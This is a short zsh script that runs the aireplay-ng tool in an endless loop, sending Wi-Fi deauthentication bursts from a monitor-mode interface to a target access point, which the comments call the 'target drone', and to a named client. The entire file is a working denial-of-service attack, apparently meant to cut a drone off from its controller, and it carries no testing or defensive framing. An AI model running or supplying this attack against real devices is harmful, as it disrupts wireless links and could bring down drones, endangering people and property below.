#!/bin/zsh
#The command line argument 1 is the monitor interface, 2 is the target drone, 3 is the target client

while true
do
	aireplay-ng $1 -0 10 -a $2 -c $3
done
